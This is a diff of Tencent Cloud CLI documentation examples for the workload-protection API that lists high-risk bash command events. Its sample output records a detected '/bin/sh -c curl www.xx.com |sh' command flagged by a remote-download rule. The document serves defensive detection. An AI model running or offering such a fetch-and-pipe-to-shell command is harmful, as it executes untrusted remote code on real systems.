@@ -1,46 +1,4 @@
-**Example 1: 获取高危命令列表**
-
-获取高危命令列表
-
-Input: 
-
-```
-tccli cwp DescribeBashEvents --cli-unfold-argument ```
-
-Output: 
-```
-{
-    "Response": {
-        "TotalCount": 1,
-        "List": [
-            {
-                "Status": 1,
-                "RuleLevel": 1,
-                "Exe": "xx",
-                "Uuid": "xx",
-                "RuleId": 1,
-                "RegexBashCmd": "xx",
-                "DetectBy": 1,
-                "RuleName": "xx",
-                "Pid": "xx",
-                "MachineName": "xx",
-                "Id": 1,
-                "Platform": 1,
-                "User": "xx",
-                "Hostip": "xx",
-                "ModifyTime": "xx",
-                "CreateTime": "xx",
-                "BashCmd": "xx",
-                "RuleCategory": 1,
-                "Quuid": "xx"
-            }
-        ],
-        "RequestId": "xx"
-    }
-}
-```
-
-**Example 2: 高危命令事件列表**
+**Example 1: 高危命令事件列表**
 
 
 
@@ -58,29 +16,30 @@ Output:
     "Response": {
         "List": [
             {
-                "Uuid": "02db9a21-78fe-4a4c-b96f-a11bf819a962",
-                "Id": 3148114,
-                "Quuid": "02db9a21-78fe-4a4c-b96f-a11bf819a962",
-                "Hostip": "192.168.111.28",
-                "User": "root",
+                "Uuid": "05f0bcab-726c-4ea4-8109-bcd03d5598f7",
+                "Id": 10001,
+                "Quuid": "05f0bcab-726c-4ea4-8109-bcd03d5598f7",
+                "Hostip": "1.1.1.1",
+                "User": "root:root",
                 "Platform": 4,
-                "BashCmd": "./r3hook_tool moc -var www.test123.com",
-                "RuleId": 0,
-                "RuleName": "sysrule_custom_procmon_1",
-                "RuleLevel": 1,
+                "BashCmd": "/bin/sh -c curl www.xx.com |sh",
+                "RuleId": 150,
+                "RuleName": "系统规则(标准)-计划任务远程下载",
+                "RuleLevel": 2,
                 "Status": 0,
-                "CreateTime": "2022-09-01 17:28:39",
-                "MachineName": "v_llzlu恶意请求",
-                "DetectBy": 0,
-                "Pid": "0",
-                "Exe": "",
-                "ModifyTime": "0001-01-01 00:00:00",
-                "RegexBashCmd": "\\./r3hook_tool moc -var www\\.test123\\.com",
-                "RuleCategory": 0
+                "CreateTime": "2024-10-17 12:16:08",
+                "MachineName": "机器名称",
+                "DetectBy": 1,
+                "Pid": "27605",
+                "Exe": "/usr/bin/bash",
+                "ModifyTime": "2024-10-17 20:09:01",
+                "RegexBashCmd": "/bin/sh -c curl www.xx.com |sh",
+                "RuleCategory": 0,
+                "HostName": "机器名称"
             }
         ],
-        "RequestId": "c787b780-0a35-4fa5-aca3-db339b9a20e8",
-        "TotalCount": 51315
+        "RequestId": "7ae8b771-d517-4f78-95e0-a5432a5f1b49",
+        "TotalCount": 1
     }
 }
 ```
